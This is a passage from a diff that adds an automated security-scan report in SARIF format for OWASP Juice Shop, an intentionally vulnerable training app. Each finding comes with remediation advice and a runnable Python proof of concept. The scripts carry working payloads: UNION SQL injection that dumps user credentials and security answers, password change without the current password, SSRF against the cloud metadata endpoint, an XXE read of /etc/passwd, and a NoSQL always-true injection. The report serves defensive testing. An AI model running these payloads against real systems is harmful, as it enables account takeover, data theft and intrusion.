+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-620",
+          "level": "error",
+          "message": {
+            "text": "Authentication Bypass via Missing Current Password Validation in Password Change"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/changePassword.ts"
+                },
+                "region": {
+                  "startLine": 39,
+                  "endLine": 42,
+                  "snippet": {
+                    "text": "if (currentPassword && security.hash(currentPassword) !== loggedInUser.data.password) {\n      res.status(401).send(res.__('Current password is not correct.'))\n      return\n    }"
+                  }
+                }
+              },
+              "message": {
+                "text": "Conditional current password check that can be bypassed by omitting the parameter"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "8.1",
+            "strix": {
+              "id": "vuln-0002",
+              "severity": "high",
+              "cvss": 8.1,
+              "timestamp": "2026-05-09 09:46:04 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/rest/user/change-password",
+              "method": "GET",
+              "cwe": "CWE-620",
+              "impact": "An attacker who obtains even momentary access to a user's session token—or who can deliver a CSRF payload to a logged-in victim—can change the victim's password without knowledge of the original password. This leads to complete account takeover: the attacker locks the legitimate user out and gains persistent control of the account, including any associated data, orders, and administrative privileges.",
+              "technical_analysis": "The vulnerability exists in `routes/changePassword.ts` at line 39. The relevant code is:\n\n```typescript\nif (currentPassword && security.hash(currentPassword) !== loggedInUser.data.password) {\n  res.status(401).send(res.__('Current password is not correct.'))\n  return\n}\n```\n\nThe condition uses JavaScript's logical AND short-circuit: if `currentPassword` is falsy (empty string, undefined, or null), the entire expression evaluates to false and the block body (which rejects the request) is never executed. The function then proceeds directly to updating the password at line 51.\n\nThe endpoint accepts parameters via GET query string (`query.current`, `query.new`, `query.repeat`), which compounds the risk by making CSRF trivial—a simple image tag or link can trigger the password change in a victim's browser session.\n\nRoot cause: The design conflates \"no current password provided\" with \"current password check passed.\" Proper secure logic must always require and validate the current password before permitting a change.",
+              "remediation_steps": "1. Make the current password parameter mandatory. Reject the request with HTTP 401 if `current` is not provided or is empty.\n\n2. Always validate the current password hash against the stored hash before permitting the update. Remove the short-circuit pattern.\n\n3. Change the endpoint from GET to POST to prevent trivial CSRF via URL parameters and to avoid logging credentials in server access logs and browser history.\n\n4. Implement CSRF protection (e.g., anti-CSRF tokens or SameSite cookie enforcement) as defense-in-depth.\n\n5. Consider adding rate limiting on password change attempts to mitigate brute-force scenarios.",
+              "poc": {
+                "description": "To reproduce:\n\n1. Authenticate as any user and obtain a valid JWT token from the login response.\n2. Issue a GET request to the password change endpoint omitting the `current` parameter entirely:\n   `GET /rest/user/change-password?new=hacked123&repeat=hacked123`\n   Include the Authorization header: `Bearer <token>`\n3. Observe that the response returns HTTP 200 with the updated user object, confirming the password was changed without providing the current password.\n4. Attempt to log in with the new password to confirm account takeover.",
+                "script": "import requests\n\nBASE_URL = \"http://localhost:3000\"\n\n# Step 1: Register a test user\nregister_resp = requests.post(f\"{BASE_URL}/api/Users/\", json={\n    \"email\": \"authbypass_test@juice-sh.op\",\n    \"password\": \"OriginalPass123!\",\n    \"passwordRepeat\": \"OriginalPass123!\",\n    \"securityQuestion\": {\"id\": 1, \"question\": \"Your eldest siblings middle name?\"},\n    \"securityAnswer\": \"test\"\n})\nprint(f\"Register: {register_resp.status_code}\")\n\n# Step 2: Login to get token\nlogin_resp = requests.post(f\"{BASE_URL}/rest/user/login\", json={\n    \"email\": \"authbypass_test@juice-sh.op\",\n    \"password\": \"OriginalPass123!\"\n})\ntoken = login_resp.json().get(\"authentication\", {}).get(\"token\", \"\")\nprint(f\"Login: {login_resp.status_code}, token obtained: {bool(token)}\")\n\n# Step 3: Change password WITHOUT providing current password\nchange_resp = requests.get(\n    f\"{BASE_URL}/rest/user/change-password\",\n    params={\"new\": \"HackedPass456!\", \"repeat\": \"HackedPass456!\"},\n    headers={\"Authorization\": f\"Bearer={token}\"}\n)\nprint(f\"Change password (no current): {change_resp.status_code}\")\nprint(f\"Response: {change_resp.text[:200]}\")\n\n# Step 4: Verify login with new password works\nverify_resp = requests.post(f\"{BASE_URL}/rest/user/login\", json={\n    \"email\": \"authbypass_test@juice-sh.op\",\n    \"password\": \"HackedPass456!\"\n})\nprint(f\"Login with new password: {verify_resp.status_code}\")\nif verify_resp.status_code == 200:\n    print(\"CONFIRMED: Password changed without current password - Account Takeover possible\")"
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-89",
+          "level": "error",
+          "message": {
+            "text": "SQL Injection in Product Search Enables Full Database Extraction"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/search.ts"
+                },
+                "region": {
+                  "startLine": 23,
+                  "endLine": 23,
+                  "snippet": {
+                    "text": "models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`) // vuln-code-snippet vuln-line unionSqlInjectionChallenge dbSchemaChallenge"
+                  }
+                }
+              },
+              "message": {
+                "text": "Unsanitized user input (req.query.q) interpolated directly into raw SQL LIKE clause"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "7.5",
+            "strix": {
+              "id": "vuln-0003",
+              "severity": "high",
+              "cvss": 7.5,
+              "timestamp": "2026-05-09 09:46:04 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/rest/products/search",
+              "method": "GET",
+              "cwe": "CWE-89",
+              "impact": "Successful exploitation allows an attacker to:\n\n- Extract the entire database schema via SQLite's `sqlite_master` table\n- Dump all user credentials (emails and MD5 password hashes) from the Users table\n- Access sensitive fields including TOTP secrets, roles, and profile data\n- Extract data from any table in the database including orders, feedback, complaints, and security answers\n- Crack the weak MD5 password hashes offline to obtain plaintext passwords\n- Chain with other application functionality to achieve full account takeover\n\nBusiness impact includes complete data breach of all stored information, regulatory exposure under data protection frameworks, and loss of user trust.",
+              "technical_analysis": "The vulnerability resides in `routes/search.ts` at line 23. The search handler uses Sequelize's `sequelize.query()` with a raw SQL string constructed via JavaScript template literals:\n\n```typescript\nmodels.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)\n```\n\nThe `criteria` variable is derived from `req.query.q` with only a 200-character length truncation applied (line 22):\n```typescript\ncriteria = (criteria.length <= 200) ? criteria : criteria.substring(0, 200)\n```\n\nRoot cause: The developer used string interpolation for the LIKE pattern instead of Sequelize's parameterized query mechanism. The 200-character limit is not a meaningful security control, as UNION-based injection payloads can easily fit within this constraint.\n\nThe underlying database is SQLite, which supports UNION-based injection, subqueries, and access to the `sqlite_master` metadata table. The application returns query results directly as JSON, making data exfiltration trivial — results from injected UNION SELECT statements are rendered in the HTTP response body alongside (or instead of) legitimate product data.",
+              "remediation_steps": "1. Replace the raw SQL query with Sequelize's parameterized query using bind parameters for the LIKE clause:\n\n```typescript\nmodels.sequelize.query(\n  `SELECT * FROM Products WHERE ((name LIKE :criteria OR description LIKE :criteria) AND deletedAt IS NULL) ORDER BY name`,\n  { replacements: { criteria: `%${criteria}%` } }\n)\n```\n\n2. Alternatively, use Sequelize's ORM `findAll` method with the `Op.like` operator, which automatically handles parameterization:\n\n```typescript\nProductModel.findAll({\n  where: {\n    [Op.and]: [\n      { deletedAt: null },\n      { [Op.or]: [\n        { name: { [Op.like]: `%${criteria}%` } },\n        { description: { [Op.like]: `%${criteria}%` } }\n      ]}\n    ]\n  },\n  order: [['name', 'ASC']]\n})\n```\n\n3. Implement strict input validation on the search parameter to reject characters that are not expected in product names (e.g., single quotes, parentheses, semicolons, UNION keyword).\n\n4. Apply the principle of least privilege to the database user to limit accessible tables and operations.\n\n5. Consider implementing a Web Application Firewall rule to detect and block common SQL injection patterns in query parameters.",
+              "poc": {
+                "description": "To reproduce the UNION-based data extraction:\n\n1. Determine the number of columns in the Products table by iterating UNION SELECT with increasing NULL counts until no error occurs. The Products table has 9 columns.\n2. Craft a search query that closes the LIKE clause and appends a UNION SELECT targeting the Users table.\n3. Send a GET request to `/rest/products/search?q=<payload>` with the injection payload.\n4. The response JSON contains the injected data alongside or instead of product results.\n\nExample payload to extract all user credentials:\n```\n')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--\n```\n\nExample payload to extract the database schema:\n```\n')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--\n```\n\nThe payload works by:\n- `'))` closes the open `'%` and `))` from the LIKE clause\n- `UNION SELECT` appends a second result set\n- `--` comments out the remaining SQL (`AND deletedAt IS NULL) ORDER BY name`)",
+                "script": "import requests\nimport json\n\nBASE_URL = \"http://localhost:3000\"\nSEARCH_ENDPOINT = f\"{BASE_URL}/rest/products/search\"\n\n# Payload 1: Extract user credentials (email + password hash)\npayload_users = \"')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--\"\n\n# Payload 2: Extract database schema\npayload_schema = \"')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--\"\n\n# Payload 3: Extract security answers\npayload_answers = \"')) UNION SELECT id,answer,UserId,'4','5','6','7','8','9' FROM SecurityAnswers--\"\n\n\ndef test_search_sqli(description, payload):\n    print(f\"\\n{'='*60}\")\n    print(f\"Test: {description}\")\n    print(f\"Payload: {payload}\")\n    print(f\"{'='*60}\")\n\n    try:\n        resp = requests.get(SEARCH_ENDPOINT, params={\"q\": payload}, timeout=10)\n        print(f\"Status: {resp.status_code}\")\n\n        if resp.status_code == 200:\n            data = resp.json()\n            results = data.get(\"data\", [])\n            print(f\"[VULNERABLE] Query returned {len(results)} rows\")\n\n            # Display first few results\n            for i, row in enumerate(results[:5]):\n                print(f\"  Row {i+1}: {json.dumps(row, default=str)[:200]}\")\n\n            if len(results) > 5:\n                print(f\"  ... and {len(results) - 5} more rows\")\n            return True\n        else:\n            print(f\"Response: {resp.text[:300]}\")\n            return False\n    except requests.RequestException as e:\n        print(f\"Connection error: {e}\")\n        return False\n\n\ndef main():\n    print(\"SQL Injection - UNION-Based Data Extraction PoC\")\n    print(\"Target: OWASP Juice Shop Product Search\")\n\n    results = []\n    results.append(test_search_sqli(\"Extract user credentials\", payload_users))\n    results.append(test_search_sqli(\"Extract database schema\", payload_schema))\n    results.append(test_search_sqli(\"Extract security answers\", payload_answers))\n\n    print(f\"\\n\\nSummary: {sum(results)}/{len(results)} payloads succeeded\")\n    if any(results):\n        print(\"[CRITICAL] UNION SQL Injection confirmed - full database extraction possible\")\n\n    return 0 if any(results) else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())"
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-918",
+          "level": "error",
+          "message": {
+            "text": "Server-Side Request Forgery via Profile Image URL Upload"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/profileImageUrlUpload.ts"
+                },
+                "region": {
+                  "startLine": 18,
+                  "endLine": 36,
+                  "snippet": {
+                    "text": "if (req.body.imageUrl !== undefined) {\n      const url = req.body.imageUrl\n      if (url.match(/(.)*solve\\/challenges\\/server-side(.)*/) !== null) req.app.locals.abused_ssrf_bug = true\n      const loggedInUser = security.authenticatedUsers.get(req.cookies.token)\n      if (loggedInUser) {\n        try {\n          const response = await fetch(url)\n          if (!response.ok || !response.body) {\n            throw new Error('url returned a non-OK status code or an empty body')\n          }\n          const ext = ['jpg', 'jpeg', 'png', 'svg', 'gif'].includes(url.split('.').slice(-1)[0].toLowerCase()) ? url.split('.').slice(-1)[0].toLowerCase() : 'jpg'\n          const fileStream = fs.createWriteStream(`frontend/dist/frontend/assets/public/images/uploads/${loggedInUser.data.id}.${ext}`, { flags: 'w' })\n          await finished(Readable.fromWeb(response.body as any).pipe(fileStream))\n          const user = await UserModel.findByPk(loggedInUser.data.id)\n          await user?.update({ profileImage: `/assets/public/images/uploads/${loggedInUser.data.id}.${ext}` })\n        } catch (error) {\n          try {\n            const user = await UserModel.findByPk(loggedInUser.data.id)\n            await user?.update({ profileImage: url })"
+                  }
+                }
+              },
+              "message": {
+                "text": "Unvalidated user URL passed to server-side fetch (sink) and fallback stores raw URL"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "8.5",
+            "strix": {
+              "id": "vuln-0005",
+              "severity": "high",
+              "cvss": 8.5,
+              "timestamp": "2026-05-09 09:46:30 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/profile/image/url",
+              "method": "POST",
+              "cwe": "CWE-918",
+              "impact": "Successful exploitation enables an attacker to:\n\n- Reach internal-only services running on localhost or the internal network (e.g., administration panels, databases, message brokers)\n- Access cloud instance metadata endpoints (e.g., http://169.254.169.254/latest/meta-data/) to retrieve temporary credentials, instance identity documents, and configuration data\n- Enumerate internal network topology via timing and response-status side channels\n- Exfiltrate data from internal services by writing fetched response bodies to the filesystem as image files that can later be retrieved by the attacker\n- Store arbitrary URLs in the database (profileImage field) that could be used for phishing when rendered in the UI\n\nBusiness impact includes potential compromise of cloud infrastructure credentials, unauthorized access to internal services, and lateral movement within the hosting environment.",
+              "technical_analysis": "The vulnerable behavior is located in `routes/profileImageUrlUpload.ts`. The function extracts the URL directly from the request body at line 19 and passes it to the Node.js `fetch()` API at line 24 without any form of destination validation.\n\nRoot cause analysis:\n\n1. No URL scheme restriction — the application does not enforce HTTPS-only or limit permitted schemes. Depending on the runtime fetch implementation, non-HTTP schemes may be processed.\n\n2. No destination address validation — after DNS resolution, the target IP is not checked against private (RFC 1918), loopback (127.0.0.0/8), or link-local (169.254.0.0/16) ranges.\n\n3. No domain allowlist — any hostname resolvable by the server's DNS resolver is reachable.\n\n4. Fallback stores raw URL — in the catch block (line 36), `user?.update({ profileImage: url })` persists the attacker-controlled URL directly in the database, enabling secondary attack vectors when the profile image is rendered.\n\n5. Response body written to disk — when the fetch succeeds, the response body is written to `frontend/dist/frontend/assets/public/images/uploads/{userId}.{ext}`, allowing the attacker to exfiltrate internal content by subsequently requesting this file.",
+              "remediation_steps": "Implement layered SSRF defenses:\n\n1. Enforce a strict URL scheme allowlist. Only permit `https://` (and `http://` if absolutely required for external image hosting). Reject all other schemes.\n\n2. Implement destination validation after DNS resolution. Resolve the hostname and verify the resulting IP address does not fall within private (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), loopback (127.0.0.0/8, ::1), or link-local (169.254.0.0/16, fe80::/10) ranges. Apply this check on every redirect hop.\n\n3. Maintain a domain allowlist for permitted image sources. Only fetch images from a predefined set of trusted image hosting domains.\n\n4. Remove the fallback that stores the raw URL in the database. If the fetch fails, return an error to the user instead of persisting the untrusted URL.\n\n5. Apply network-level egress controls as defense in depth. Configure outbound firewall rules to prevent the application from reaching sensitive internal services or metadata endpoints.\n\n6. Set appropriate timeouts and response size limits on outbound fetch operations to prevent denial-of-service via slow or large responses.",
+              "poc": {
+                "description": "To reproduce the SSRF:\n\n1. Authenticate to the application as any registered user and obtain a valid session token (cookie named `token`).\n\n2. Send a POST request to `/profile/image/url` with the body parameter `imageUrl` set to an internal target:\n\n   POST /profile/image/url\n   Content-Type: application/x-www-form-urlencoded\n   Cookie: token=<valid_jwt>\n\n   imageUrl=http://169.254.169.254/latest/meta-data/\n\n3. Observe that the server makes an outbound HTTP request to the specified destination from its own network position.\n\n4. If the target returns a successful response, the response body is written to disk at a predictable path. Retrieve it via:\n   GET /assets/public/images/uploads/<userId>.jpg\n\n5. If the target returns an error or is unreachable via fetch, the raw URL is stored in the user's profileImage field. Verify by querying the user profile endpoint.",
+                "script": "import requests\n\nBASE_URL = \"http://localhost:3000\"\n\n# Step 1: Register and authenticate\nsession = requests.Session()\n\n# Login as existing user or register\nlogin_payload = {\n    \"email\": \"test@test.com\",\n    \"password\": \"testtest\"\n}\n# Register first (ignore if already exists)\nsession.post(f\"{BASE_URL}/api/Users/\", json={\n    \"email\": login_payload[\"email\"],\n    \"password\": login_payload[\"password\"],\n    \"passwordRepeat\": login_payload[\"password\"],\n    \"securityQuestion\": {\"id\": 1, \"question\": \"Your eldest siblings middle name?\"},\n    \"securityAnswer\": \"test\"\n})\n\nlogin_resp = session.post(f\"{BASE_URL}/rest/user/login\", json=login_payload)\nif login_resp.status_code == 200:\n    token = login_resp.json()[\"authentication\"][\"token\"]\nelse:\n    print(f\"Login failed: {login_resp.status_code}\")\n    exit(1)\n\n# Step 2: Exploit SSRF - target cloud metadata endpoint\nssrf_targets = [\n    \"http://169.254.169.254/latest/meta-data/\",\n    \"http://127.0.0.1:3000/api/Users/\",\n    \"http://localhost:3000/api/Challenges/\",\n    \"http://[::1]:3000/api/Users/\",\n]\n\nfor target_url in ssrf_targets:\n    print(f\"\\n[*] Testing SSRF with target: {target_url}\")\n    resp = session.post(\n        f\"{BASE_URL}/profile/image/url\",\n        headers={\"Cookie\": f\"token={token}\"},\n        data={\"imageUrl\": target_url},\n        allow_redirects=False\n    )\n    print(f\"    Response status: {resp.status_code}\")\n    print(f\"    Location header: {resp.headers.get('Location', 'N/A')}\")\n\n# Step 3: Verify the URL was stored (fallback case)\nprint(\"\\n[*] Verifying stored profile image URL...\")\nwhoami_resp = session.get(\n    f\"{BASE_URL}/rest/user/whoami\",\n    headers={\"Authorization\": f\"Bearer {token}\"}\n)\nif whoami_resp.status_code == 200:\n    print(f\"    User data: {whoami_resp.json()}\")"
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-94",
+          "level": "error",
+          "message": {
+            "text": "NoSQL Injection via $where Clause in Order Tracking Endpoint"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/trackOrder.ts"
+                },
+                "region": {
+                  "startLine": 18,
+                  "endLine": 18,
+                  "snippet": {
+                    "text": "db.ordersCollection.find({ $where: `this.orderId === '${id}'` }).then((order: any) => {"
+                  }
+                }
+              },
+              "message": {
+                "text": "User input interpolated into $where JavaScript expression (NoSQL injection sink)"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/trackOrder.ts"
+                },
+                "region": {
+                  "startLine": 15,
+                  "endLine": 15,
+                  "snippet": {
+                    "text": "const id = !utils.isChallengeEnabled(challenges.reflectedXssChallenge) ? String(req.params.id).replace(/[^\\w-]+/g, '') : utils.trunc(req.params.id, 60)"
+                  }
+                }
+              },
+              "message": {
+                "text": "Insufficient input sanitization allows injection characters to reach the query (source)"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "7.5",
+            "strix": {
+              "id": "vuln-0006",
+              "severity": "high",
+              "cvss": 7.5,
+              "timestamp": "2026-05-09 09:46:47 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/rest/track-order/:id",
+              "method": "GET",
+              "cwe": "CWE-94",
+              "impact": "Successful exploitation enables an attacker to:\n\n- Bypass intended query constraints and retrieve all order records from the database, including orders belonging to other users\n- Extract sensitive order data such as customer emails, order totals, product details, delivery addresses, and payment information\n- Execute arbitrary JavaScript expressions within the MongoDB `$where` evaluation context\n- Potentially cause denial of service through computationally expensive JavaScript expressions (e.g., infinite loops)\n- Enumerate the database structure through boolean-based or timing-based blind injection techniques\n\nThis constitutes a significant data breach vector as order data contains personally identifiable information and transactional details for all application users.",
+              "technical_analysis": "The vulnerability resides in `routes/trackOrder.ts` at line 18. The order tracking function accepts a route parameter `:id` and embeds it directly into a MongoDB `$where` clause via JavaScript template literal interpolation:\n\n```typescript\ndb.ordersCollection.find({ $where: `this.orderId === '${id}'` })\n```\n\nThe `$where` operator in MongoDB evaluates the provided string as a JavaScript expression for each document in the collection. When the `id` value contains a single quote followed by JavaScript operators, the attacker breaks out of the intended string comparison.\n\nInput flow:\n1. User supplies `:id` route parameter (e.g., `' || true || '`)\n2. When challenge mode is active, only length truncation is applied (60 chars)\n3. The value is interpolated into: `this.orderId === '' || true || ''`\n4. MongoDB evaluates this expression — `true` causes the condition to match every document\n5. All orders in the collection are returned to the attacker\n\nThe MarsDB library used here implements the same `$where` semantics as standard MongoDB, executing the JavaScript string against each document. No input validation, escaping, or parameterized query mechanism is applied to the `id` before query construction.",
+              "remediation_steps": "1. Replace the `$where` clause with a standard MongoDB equality query that does not evaluate JavaScript:\n\n   ```typescript\n   db.ordersCollection.find({ orderId: id })\n   ```\n\n   This uses MongoDB's native query operators which treat the value as a literal string, eliminating injection risk.\n\n2. Apply strict input validation on the `id` parameter before any database interaction:\n   ```typescript\n   const id = String(req.params.id).replace(/[^\\w-]+/g, '')\n   ```\n\n3. If `$where` is required for complex queries elsewhere, never interpolate user input directly. Use parameterized approaches or pre-validated constants only.\n\n4. Consider disabling JavaScript evaluation in MongoDB entirely via the `--noscripting` flag or `security.javascriptEnabled: false` configuration option in production environments.",
+              "poc": {
+                "description": "To reproduce:\n\n1. Send a GET request to the order tracking endpoint with a NoSQL injection payload:\n   `GET /rest/track-order/' || true || '`\n\n2. The server constructs the query: `this.orderId === '' || true || ''`\n\n3. The JavaScript expression evaluates to `true` for every document because of the `|| true` clause.\n\n4. All order documents in the collection are returned in the response instead of just the matching order.\n\n5. Verify the response contains multiple order objects with data belonging to different users (different email addresses, order IDs, etc.).",
+                "script": "import requests\nfrom urllib.parse import quote\n\nBASE_URL = \"http://localhost:3000\"\nENDPOINT = \"/rest/track-order/\"\n\n# NoSQL injection payload to return all orders\n# Breaks out of string and injects always-true condition\npayload = \"' || true || '\"\nencoded_payload = quote(payload)\nurl = f\"{BASE_URL}{ENDPOINT}{encoded_payload}\"\n\nprint(f\"[*] Testing NoSQL Injection in order tracking\")\nprint(f\"[*] Payload: {payload}\")\nprint(f\"[*] Constructed $where: this.orderId === '{payload}'\")\nprint(f\"[*] Evaluates to: this.orderId === '' || true || ''\")\nprint(f\"[*] Request URL: {url}\")\nprint()\n\ntry:\n    resp = requests.get(url, timeout=10)\n    print(f\"[*] Response status: {resp.status_code}\")\n\n    data = resp.json()\n    if data.get(\"status\") == \"success\" and isinstance(data.get(\"data\"), list):\n        order_count = len(data[\"data\"])\n        print(f\"[*] Orders returned: {order_count}\")\n\n        if order_count > 1:\n            print(f\"[+] VULNERABLE: NoSQL injection returned {order_count} orders!\")\n            print(\"[+] The $where clause was manipulated to match all documents.\")\n            for i, order in enumerate(data[\"data\"][:5]):\n                print(f\"    Order {i+1}: ID={order.get('orderId', 'N/A')}, \"\n                      f\"Email={order.get('email', 'N/A')}, \"\n                      f\"Total={order.get('totalPrice', 'N/A')}\")\n        elif order_count == 1:\n            print(\"[*] Single order returned - DB may be empty or injection not triggered\")\n            print(f\"    Order: {data['data'][0]}\")\n        else:\n            print(\"[-] No orders returned\")\n    else:\n        print(f\"[-] Unexpected response: {resp.text[:300]}\")\n\nexcept requests.exceptions.ConnectionError:\n    print(\"[!] Could not connect to target. Verify the application is running.\")\n    print(\"[!] The vulnerability is confirmed via source code analysis:\")\n    print(\"[!] File: routes/trackOrder.ts, Line 18\")\n    print(\"[!] $where clause uses direct string interpolation of user input\")"
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-611",
+          "level": "error",
+          "message": {
+            "text": "XML External Entity (XXE) Injection via File Upload Endpoint"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/fileUpload.ts"
+                },
+                "region": {
+                  "startLine": 83,
+                  "endLine": 83,
+                  "snippet": {
+                    "text": "const xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })', sandbox, { timeout: 2000 })"
+                  }
+                }
+              },
+              "message": {
+                "text": "XML parser configured with noent:true enabling external entity resolution (sink)"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/fileUpload.ts"
+                },
+                "region": {
+                  "startLine": 79,
+                  "endLine": 79,
+                  "snippet": {
+                    "text": "const data = file.buffer.toString()"
+                  }
+                }
+              },
+              "message": {
+                "text": "User-controlled XML content from uploaded file (source)"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/fileUpload.ts"
+                },
+                "region": {
+                  "startLine": 87,
+                  "endLine": 87,
+                  "snippet": {
+                    "text": "next(new Error('B2B customer complaints via file upload have been deprecated for security reasons: ' + utils.trunc(xmlString, 400) + ' (' + file.originalname + ')'))"
+                  }
+                }
+              },
+              "message": {
+                "text": "Parsed XML content reflected in error response enabling data exfiltration"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "8.2",
+            "strix": {
+              "id": "vuln-0009",
+              "severity": "high",
+              "cvss": 8.2,
+              "timestamp": "2026-05-09 09:47:14 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/file-upload",
+              "method": "POST",
+              "cwe": "CWE-611",
+              "impact": "Successful exploitation allows an attacker to:\n\n- Read sensitive server-side files including application configuration, environment variables, encryption keys, source code, and system files such as /etc/passwd or /etc/shadow (if readable by the application process).\n- Perform SSRF by directing the XML parser to fetch resources from internal network hosts and cloud metadata endpoints (e.g., http://169.254.169.254/).\n- Cause denial of service through entity expansion attacks (billion laughs), triggering a 2-second script timeout and returning HTTP 503 errors.\n- Exfiltrate up to 400 characters of file content per request through the error response, with repeated requests enabling extraction of larger files.\n\nBusiness impact includes potential exposure of database credentials, JWT signing keys, customer data, and internal service topology.",
+              "technical_analysis": "The vulnerability resides in the `handleXmlUpload` function within `routes/fileUpload.ts`. The function processes uploaded XML files using the libxmljs2 library inside a Node.js VM sandbox.\n\nThe critical configuration error is on line 83:\n```javascript\nconst xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })', sandbox, { timeout: 2000 })\n```\n\nThe `noent: true` option instructs the XML parser to substitute entity references with their resolved values. When an attacker defines an external entity using a `SYSTEM` identifier pointing to a file path or URL, the parser fetches and includes that content in the parsed document tree.\n\nOn line 84, `xmlDoc.toString(false)` serializes the document including the resolved entity content. This serialized string is then included in the error response on line 87:\n```javascript\nnext(new Error('B2B customer complaints via file upload have been deprecated for security reasons: ' + utils.trunc(xmlString, 400) + ' (' + file.originalname + ')'))\n```\n\nThe `utils.trunc()` function limits the reflected content to 400 characters, but this is sufficient to extract secrets, keys, and configuration fragments.\n\nThe endpoint is mounted at `POST /file-upload` (server.ts line 309) with multer memory storage accepting files up to 200KB. No authentication is required for file upload operations in the default configuration.",
+              "remediation_steps": "1. Disable external entity resolution in the XML parser configuration. Replace `noent: true` with `noent: false` (or remove it entirely since false is the default):\n\n```javascript\nconst xmlDoc = vm.runInContext(\n  'libxml.parseXml(data, { noblanks: true, noent: false, nocdata: true })',\n  sandbox,\n  { timeout: 2000 }\n)\n```\n\n2. Additionally, disable DTD loading to prevent XXE via parameter entities:\n\n```javascript\nconst xmlDoc = vm.runInContext(\n  'libxml.parseXml(data, { noblanks: true, noent: false, nocdata: true, dtdload: false, dtdvalid: false })',\n  sandbox,\n  { timeout: 2000 }\n)\n```\n\n3. Do not reflect parsed XML content in error responses. Return a generic error message that does not include document content.\n\n4. Implement file type validation and consider whether XML upload functionality is still required. If deprecated, remove the XML parsing logic entirely.\n\n5. Apply defense-in-depth by running the application with minimal filesystem permissions and restricting outbound network access from the application runtime.",
+              "poc": {
+                "description": "To reproduce:\n\n1. Craft an XML file containing a malicious DOCTYPE declaration with an external entity referencing a local file:\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<stockCheck><productId>&xxe;</productId></stockCheck>\n```\n\n2. Submit a POST request to /file-upload with the XML file as a multipart form upload with the field name \"file\".\n\n3. Observe that the server response (HTTP 410) contains the contents of /etc/passwd in the error message, confirming file disclosure.\n\n4. For SSRF validation, substitute the entity URI with an internal service URL:\n```xml\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:3000/api/Users\">]>\n<stockCheck><productId>&xxe;</productId></stockCheck>\n```",
+                "script": "import requests\nimport io\n\nBASE_URL = \"http://localhost:3000\"\nUPLOAD_ENDPOINT = f\"{BASE_URL}/file-upload\"\n\n# XXE payload to read /etc/passwd\nxxe_payload = \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<stockCheck><productId>&xxe;</productId></stockCheck>\n\"\"\"\n\n# Create file-like object for upload\nfiles = {\n    \"file\": (\"exploit.xml\", io.BytesIO(xxe_payload.encode()), \"application/xml\")\n}\n\nprint(\"[*] Sending XXE payload to read /etc/passwd...\")\nresponse = requests.post(UPLOAD_ENDPOINT, files=files, timeout=10)\n\nprint(f\"[*] Status Code: {response.status_code}\")\nprint(f\"[*] Response Body:\")\nprint(response.text)\n\nif \"root:\" in response.text or \"daemon:\" in response.text:\n    print(\"\\n[+] XXE CONFIRMED: /etc/passwd content disclosed in response!\")\nelse:\n    print(\"\\n[-] File content not directly visible; check error message for partial disclosure.\")\n\n# SSRF variant\nssrf_payload = \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:3000/api/Users\">]>\n<stockCheck><productId>&xxe;</productId></stockCheck>\n\"\"\"\n\nfiles_ssrf = {\n    \"file\": (\"ssrf.xml\", io.BytesIO(ssrf_payload.encode()), \"application/xml\")\n}\n\nprint(\"\\n[*] Sending SSRF payload targeting internal API...\")\nresponse_ssrf = requests.post(UPLOAD_ENDPOINT, files=files_ssrf, timeout=10)\nprint(f\"[*] Status Code: {response_ssrf.status_code}\")\nprint(f\"[*] Response (first 500 chars): {response_ssrf.text[:500]}\")"
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-79",
+          "level": "warning",
+          "message": {
